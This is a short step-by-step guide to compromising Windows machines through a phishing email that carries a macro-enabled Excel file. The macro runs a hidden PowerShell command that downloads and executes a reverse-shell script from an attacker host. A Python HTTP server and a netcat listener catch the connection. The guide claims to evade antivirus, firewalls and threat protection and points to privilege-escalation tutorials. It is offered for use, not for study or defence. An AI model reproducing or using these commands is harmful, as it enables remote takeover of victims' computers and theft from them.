Step 1.

Download the excel macro enable sheet and make below chnages to the macro name 'test' or you can create a new macro and copy paste the code and make chnages to the beow line.

"Powershell -windowstyle hidden -Command IEX(New-Object Net.WebClient).downloadString('http://ip address:port/filename.ps1')"

ip address - Adress of attacker machine

port -  Port that you are using to serve HTTP can be anything

filename - the powershell file that contains the malicious code for reverse shell.

Step 2.

Start Kali linux edit the shell.ps1 file or your revershell file and add the attacker ip address.

Step 3.

Use python for simple HTTP server on the port of your choice.

for ex: python -m  SimpleHTTPServer 8080

Step 4.

netcat for verbose interaction once the target machine connects back

for ex: nc -lvp 4444

Step 5

Send the file via email and wait for the attacker to open and execute and you get a shell.

Enjoy!!

This was not detected by Antivirus, Threat Protection or by Firewall. Works 100% till date accurately. I haven't provided the privilege escaltion to get root so figure it out by yourself. Or follow the below links.

https://www.fuzzysecurity.com/tutorials/16.html
https://sec-consult.com/en/blog/2019/04/windows-privilege-escalation-an-approach-for-penetration-testers/





